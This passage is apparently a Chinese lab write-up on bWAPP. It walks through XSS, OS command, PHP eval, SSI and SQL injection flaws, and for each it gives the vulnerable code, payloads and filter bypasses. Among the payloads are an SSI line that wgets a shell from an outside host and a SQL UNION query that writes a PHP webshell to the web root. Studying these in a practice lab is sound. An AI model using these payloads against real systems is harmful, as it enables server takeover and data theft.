<h2 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//闭合 iframe 之后再写入注入脚本</span></span><br><span class="line">?ParamUrl=robots.txt&amp;ParamWidth=<span class="number">250</span>&amp;ParamHeight=<span class="number">250</span><span class="string">"&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_3.png" alt></p>
<h2 id="防护方式-4"><a href="#防护方式-4" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 进行转义，无法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.</span></span><br><span class="line">    <span class="comment">// These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).</span></span><br><span class="line">    <span class="comment">// Do NOT use this for XSS or HTML validations!!!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 addslashes 函数防护，payload 和未防护时相同，可以触发 xss。为什么这个防护是无效的？</p>
<p>本地复现一下，两个文件，iframexss.php 和 xss.txt，xss.txt 中内容随意。</p>
<p>iframexss.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// xss 过滤</span><br><span class="line">function xss($data)&#123;</span><br><span class="line">	return addslashes($data);</span><br><span class="line">&#125;</span><br><span class="line">// 输出传入参数</span><br><span class="line">echo $_SERVER[&quot;QUERY_STRING&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt; iframe xss&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt; xss &lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is an iframe xss !&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&quot;ParamHeight&quot;]) &amp;&amp; isset($_GET[&quot;ParamWidth&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe frameborder=&quot;0&quot; src=&quot;xss.txt&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_4.png" alt></p>
<h1 id="LDAP-Injection-Search"><a href="#LDAP-Injection-Search" class="headerlink" title="LDAP Injection (Search)"></a>LDAP Injection (Search)</h1><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>LDAP 是轻量级目录访问协议。</p>
<p>目录服务是一种特殊的数据库，专门用于保存某些属性的详细信息，比如，电话簿，地址簿，人员组织管理等等。</p>
<p>而 LDAP 类似于目录服务，只不过存储的是文件目录，存储位置为各大厂商，比如 SUN，IBM，Microsoft等等。LDAP 本身并不是目录数据库。它是一种提供访问目录数据库方法的服务和协议。</p>
<p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。LDAP不仅可以从目录数据库查询对象，还可以用于管理和身份验证。</p>
<p>一些参数如图：</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_5.png" alt></p>
<p>如果把 LDAP 和 数据库类比起来，数据库是以 表-字段-值 的形式来存储数据，而 LDAP 目录是以树的形式存储数据。dn 和库名对应，dc 和表名对应，ou 和字段对应，cn 是要查询的目标名称</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_6.png" alt></p>
<h2 id="产生原因-5"><a href="#产生原因-5" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h2><p>This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree.The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</p>
<p>CVE-2018-12689</p>
<p>CVE-2018-5730</p>
<p>CVE-2016-8750</p>
<p>CVE-2011-4069</p>
<h2 id="防护方式-5"><a href="#防护方式-5" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="Mail-Header-Injection-SMTP"><a href="#Mail-Header-Injection-SMTP" class="headerlink" title="Mail Header Injection (SMTP)"></a>Mail Header Injection (SMTP)</h1><p><a href="https://www.freebuf.com/articles/web/14918.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/14918.html</a></p>
<p><a href="https://www.acunetix.com/blog/articles/email-header-injection/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/email-header-injection/</a></p>
<h1 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h1><h2 id="产生原因-6"><a href="#产生原因-6" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">commandi</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"target"</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">      $target = $_POST[<span class="string">"target"</span>];</span><br><span class="line">      <span class="keyword">if</span>($target == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Enter a domain name...&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;p align=\"left\"&gt;"</span>.shell_exec(<span class="string">"nslookup  "</span>.commandi($target)).<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入一个域名，返回它的 DNS 信息，这里没有对输入进行过滤，可以实现任意命令执行。</p>
<p>这里是通过 shell_exec 函数执行系统命令，类似的函数还有 system，exec</p>
<h2 id="利用方式-6"><a href="#利用方式-6" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ; 结尾，执行完前面的命令再执行 whoami</span></span><br><span class="line">www.baidu.com ; whoami</span><br><span class="line"><span class="comment">// | 不执行前面的，只执行 whoami</span></span><br><span class="line">www.baidu.com | whoami</span><br><span class="line"><span class="comment">// &amp;&amp; 先执行前面的，再执行 whoami</span></span><br><span class="line">www.baidu.com &amp;&amp; whoami</span><br><span class="line"><span class="comment">// &amp; 先执行 whoami 再执行前面的</span></span><br><span class="line">www.baidu.com &amp; whoami</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-6"><a href="#防护方式-6" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">commandi</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $input = str_replace(<span class="string">"&amp;"</span>, <span class="string">""</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">";"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只过滤了 <code>&amp;</code> 和 <code>;</code> ，仍然可以使用 <code>|</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">commandi_check_2</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> escapeshellcmd($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>escapeshellcmd 对 shell 元字符转义</p>
<p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 &#39; 和 “ 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
<h1 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h1><h2 id="产生原因-7"><a href="#产生原因-7" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_REQUEST[&quot;message&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">  &lt;p&gt;&lt;i&gt;&lt;?php @eval (&quot;echo &quot;.$_REQUEST[&quot;message&quot;].&quot;;&quot;);?&gt;&lt;/i&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>eval 函数执行 message 传入的参数，且没有过滤参数</p>
<p>如果输入 phpinfo() ，输出代码就变为 <code>&lt;?php @eval(&quot;echo phpinfo();&quot;) ?&gt;</code>，这样就实现了任意代码执行，类似的函数还有 assert 函数</p>
<h2 id="利用方式-7"><a href="#利用方式-7" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看 phpinfo</span></span><br><span class="line">?message=phpinfo()</span><br><span class="line"><span class="comment">// 查看目录</span></span><br><span class="line">?message=var_dump(scandir(<span class="string">'./'</span>))</span><br><span class="line"><span class="comment">// 执行任意命令</span></span><br><span class="line"><span class="number">1</span>;system(whoami)</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-7"><a href="#防护方式-7" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"message"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   &lt;p&gt;&lt;i&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($_REQUEST[<span class="string">"message"</span>], ENT_QUOTES, <span class="string">"UTF-8"</span>);;<span class="meta">?&gt;</span>&lt;/i&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>htmlspecialchars 过滤且没有 eval 函数</p>
<h1 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h1><h2 id="补充知识-1"><a href="#补充知识-1" class="headerlink" title="补充知识"></a>补充知识</h2><p>SSIs are directives present on Web applications used to feed an HTML<br>page with dynamic contents. They are similar to CGIs, except that SSIs<br>are used to execute some actions before the current page is loaded or<br>while the page is being visualized. In order to do so, the web server<br>analyzes SSI before supplying the page to the user. </p>
<p>The Server-Side Includes attack allows the exploitation of a web<br>application by injecting scripts in HTML pages or executing arbitrary<br>codes remotely. It can be exploited through manipulation of SSI in use<br>in the application or force its use through user input fields. </p>
<p>SSIs 是使用动态内容填充 HTML 页面。它和 CGIs 类似，但是 SSIs 会在页面加载之前或者用户看到之前进行一些动作。在把页面返回给用户之前，Web 服务器会解析 SSI。SSI 攻击允许利用 Web 应用在 HTML 页面中插入脚本或者执行任意远程代码。它可以通过使用 SSI 操作的 Web 应用利用，或者通过用户输入字段强制使用。</p>
<p>SSI 类似于模板渲染，在页面加载之前，服务器会解析其中的内容。</p>
<p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></p>
<h2 id="产生原因-8"><a href="#产生原因-8" class="headerlink" title="产生原因"></a>产生原因</h2><p>ssii.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $firstname = ucwords(xss($_POST[<span class="string">"firstname"</span>]));</span><br><span class="line">    $lastname = ucwords(xss($_POST[<span class="string">"lastname"</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $field_empty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $line = <span class="string">'&lt;p&gt;Hello '</span>.$firstname.<span class="string">' '</span>.$lastname.<span class="string">',&lt;/p&gt;&lt;p&gt;Your IP address is:'</span>.<span class="string">'&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var="REMOTE_ADDR" --&gt;&lt;/h1&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Writes a new line to the file</span></span><br><span class="line">        $fp = fopen(<span class="string">"ssii.shtml"</span>, <span class="string">"w"</span>);</span><br><span class="line">        fputs($fp, $line, <span class="number">200</span>);</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        header(<span class="string">"Location: ssii.shtml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ssii.shtml</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello Wwww Wwww,<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Your IP address is:<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="comment">&lt;!--#echo var="REMOTE_ADDR" --&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>未对输入过滤，导致可以构造 SSI 语句，提交到后端执行</p>
<h2 id="利用方式-8"><a href="#利用方式-8" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// List files of directory</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="ls" --&gt;</span></span><br><span class="line">// Get shell</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="防护方式-8"><a href="#防护方式-8" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 addslashes 函数转义，把双引号去掉就可以了</p>
<p>绕过 : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// List files of directory</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=ls --&gt;</span></span><br><span class="line">// Get shell</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=wget http://mysite.com/shell.txt | rename shell.txt shell.php --&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 函数转义</p>
<h1 id="SQL-Injection-GET-Search"><a href="#SQL-Injection-GET-Search" class="headerlink" title="SQL Injection (GET/Search)"></a>SQL Injection (GET/Search)</h1><h2 id="产生原因-9"><a href="#产生原因-9" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入参数 title，查询数据库中是否有满足 title 条件的记录</p>
<p>此处未对传入参数过滤，如果输入 <code>a%&#39;</code>，输出代码就变为 <code>SELECT * FROM movies WHERE title LIKE &#39;%a%&#39;%&#39;</code>，语句错误，报错无法查询</p>
<h2 id="利用方式-9"><a href="#利用方式-9" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 判断查询的字段数及出现位置</span><br><span class="line">a%&apos; union select 1,2,3,4,5,6,7 #</span><br><span class="line">// 查询所有表</span><br><span class="line">a%&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7 #</span><br><span class="line">// 写入 shell (如果有写入权限)</span><br><span class="line">a%&apos; union select 1,&quot;&lt;?php echo shell_exec($_GET[&apos;cmd&apos;])?&gt;&quot;,3,4,5,6,7 into OUTFILE &apos;/var/www/bWAPP/shell.php&apos; #</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-9"><a href="#防护方式-9" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>addslashes 转义，暂时没有绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mysql_real_escape_string 函数转义 SQL 语句中使用的字符串中的特殊字符，暂时没有绕过</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_7.png" alt></p>
<p>这两处防护无法绕过，因为绕过需要闭合 <code>&#39;%</code>，就必须要 <code>&#39;</code>，这两个函数过滤了 <code>&#39;&#39;</code></p>
<h1 id="SQL-Injection-GET-Select"><a href="#SQL-Injection-GET-Select" class="headerlink" title="SQL Injection (GET/Select)"></a>SQL Injection (GET/Select)</h1><h2 id="产生原因-10"><a href="#产生原因-10" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"movie"</span>]))</span><br><span class="line">&#123;   </span><br><span class="line">    $id = $_GET[<span class="string">"movie"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the user selects a movie</span></span><br><span class="line">    <span class="keyword">if</span>($id)        </span><br><span class="line">    &#123;</span><br><span class="line">        $sql.= <span class="string">" WHERE id = "</span> . sqli($id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理同上，当传入参数 movie 为 <code>1&#39;</code>时，语句为 <code>SELECT * FROM movies WHERE id = 1&#39;</code>，语法错误，无法查询</p>
<h2 id="利用方式-10"><a href="#利用方式-10" class="headerlink" title="利用方式"></a>利用方式</h2><p>同上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 判断查询的字段数及出现位置</span><br><span class="line">?movie=-1 union select 1,2,3,4,5,6,7 %23</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-10"><a href="#防护方式-10" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function sqli($data)&#123;</span><br><span class="line">    return mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里不需要单引号也可以注入</p>
<p>绕过 : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?movie=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7 %23</span><br></pre></td></tr></table></figure>

